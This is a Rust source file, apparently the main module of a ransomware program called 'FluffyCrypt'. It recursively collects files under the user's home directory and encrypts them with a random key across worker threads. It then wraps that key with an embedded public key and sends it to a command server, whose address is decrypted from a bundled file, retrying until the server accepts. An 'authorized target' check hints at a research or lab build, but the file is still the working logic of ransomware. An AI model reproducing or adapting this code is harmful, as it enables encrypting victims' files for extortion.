use comms::{generate_ucid, Message};
use encryptor::wrap_key;
use filesystem::recurse_directory_with_channel;
use obfuscation::get_ip;
use safeguard::should_disable_crypto;
use std::thread::sleep;
use std::time::Duration;
use std::vec::Vec;
use std::{env, process::Command};
use tokio::net::TcpSocket;
use tracing::{self, event, Level};
use tracing_subscriber::fmt::Subscriber;

use zeroize::Zeroize;

mod comms;
mod encryptor;
mod filesystem;
mod obfuscation;
mod safeguard;

const THREADS: i32 = 8;

#[allow(dead_code)]
#[cfg(unix)]
/// A PEM formatted public key, corresponding with the server's private key
const PUB_KEY: &[u8] = include_bytes!("../pub.key");

#[allow(dead_code)]
#[cfg(windows)]
const PUB_KEY: &[u8] = include_bytes!("..\\pub.key");

#[allow(dead_code)]
#[cfg(unix)]
/// A PKCS1 formatted binary file containing the IP/PORT ciphertext
const SERVER_IP: &[u8] = include_bytes!("../ip-port.bin");

#[allow(dead_code)]
#[cfg(windows)]
const SERVER_IP: &[u8] = include_bytes!("..\\ip-port.bin");

#[tokio::main]
async fn main() {
    // set up monitor
    let mut builder = Subscriber::builder();
    if Ok(String::from("TRUE")) == env::var("FLUFFYCRYPT_DEV") {
        builder = builder.with_max_level(Level::DEBUG);
    }
    builder = builder.with_thread_ids(true);
    let subscriber = builder.finish();
    tracing::subscriber::set_global_default(subscriber).expect("setting tracing default failed");
    event!(Level::INFO, "-- REACHED STAGE: Tracing Started --");

    // preflight checks (make sure system is an authorized target)
    let disable_cryptography = should_disable_crypto();

    let mut key = encryptor::generate_random(32);
    let (s, r) = crossbeam_channel::unbounded();

    event!(Level::INFO, "-- REACHED STAGE: Recurser Start --");

    if cfg!(target_os = "linux") {
        let _ = Command::new("ulimit").arg("-n 1048576").output(); // set file ulimit to prevent termination from file handler leak
    }
    recurse_directory_with_channel(dirs::home_dir().unwrap(), &s);

    if !disable_cryptography {
        let mut threads = Vec::new();

        event!(Level::INFO, "-- REACHED STAGE: Worker Start --");
        for _ in 0..THREADS {
            // start workers
            let thread_reciever = r.clone();
            let thread_key = key.clone();
            threads.push(tokio::spawn(async move {
                encryptor::encrypt_files(thread_reciever, thread_key, true).await;
            }));
        }

        for thread in threads {
            let _ = thread.await;
        }
    } else {
        event!(Level::INFO, "-- SKIPPED STAGE: Worker Start --");
    }
    //let _ = write(PathBuf::from("/home/kobiske/Videos/key.key"), &key);

    event!(Level::INFO, "-- REACHED STAGE: Key Wrap --");
    let encrypted_key = wrap_key(&key);

    let mut ucid = generate_ucid().unwrap();

    let ip = get_ip();

    key.zeroize(); // zero out key, not needed anymore

    event!(Level::INFO, "-- REACHED STAGE: Networking --");
    let mut register_blob =
        comms::Message::RegisterClient((ucid, encrypted_key.as_slice())).to_req();

    let addr = ip.parse().unwrap();

    // set up networking primitives
    let socket = TcpSocket::new_v4().unwrap();
    let mut stream = socket.connect(addr).await.unwrap();
    let mut read_buff = vec![0; 1024];

    event!(Level::DEBUG, "-- REACHED STAGE: Transmission Start --");
    loop {
        event!(Level::DEBUG, "Waiting for stream to become writable...");
        if stream.writable().await.is_ok() {
            event!(Level::DEBUG, "Stream is writable, transmitting!");
            // transmit registration request
            let len = stream.try_write(&register_blob);
            if len.is_err() {
                event!(Level::ERROR, "Error detected, retrying after 1ms.");
                // retry immediately, connection appears to be active
                sleep(Duration::from_millis(1));
                continue;
            } else if len.as_ref().is_ok_and(|x| *x == 0) {
                event!(
                    Level::WARN,
                    "Connection dropped by server. Assumed rate limit, reconnecting and retrying after 30 seconds."
                );
                sleep(Duration::from_secs(31));
                let socket = TcpSocket::new_v4().unwrap();
                event!(Level::DEBUG, "Reconnecting to server...");
                stream = socket.connect(addr).await.unwrap();
                continue;
            }
        }

        event!(Level::DEBUG, "Waiting for stream to become readable...");
        if stream.readable().await.is_ok() {
            event!(Level::DEBUG, "Stream is readable, reading!");
            let len = stream.try_read(&mut read_buff);

            if len.is_err() {
                event!(Level::ERROR, "Error detected, retrying after 1ms.");
                // retry immediately, connection appears to be active
                sleep(Duration::from_millis(1));
                continue;
            } else if len.as_ref().is_ok_and(|x| *x == 0) {
                event!(
                    Level::WARN,
                    "Connection dropped by server. Assumed rate limit, reconnecting and retrying after 30 seconds."
                );
                sleep(Duration::from_secs(31));
                let socket = TcpSocket::new_v4().unwrap();
                event!(Level::INFO, "Reconnecting to server...");
                stream = socket.connect(addr).await.unwrap();
                continue;
            }

            let len = len.unwrap(); // len is valid, it's safe to unwrap

            match Message::from_req(&mut read_buff[0..len]) {
                Message::UcidReject(_) => {
                    event!(
                        Level::WARN,
                        "UCID rejected by server. Generating a new one and retrying immediately."
                    );
                    ucid = generate_ucid().unwrap();
                    register_blob =
                        comms::Message::RegisterClient((ucid, encrypted_key.as_slice())).to_req();
                }
                Message::RateReject() => {
                    event!(
                    Level::WARN,
                    "Connection dropped by server. Assumed rate limit, reconnecting and retrying after 30 seconds."
                );
                    sleep(Duration::from_secs(31));
                    let socket = TcpSocket::new_v4().unwrap();
                    event!(Level::DEBUG, "Reconnecting to server...");
                    stream = socket.connect(addr).await.unwrap();
                    continue;
                }
                Message::Accepted(_) => {
                    // registration accepted, no need to retry
                    event!(
                        Level::INFO,
                        "Transmission Successful. Client ID is: {}. This application will now exit.",
                        ucid
                    );
                    break;
                }
                _ => {
                    continue;
                }
            }
        }
    }
}
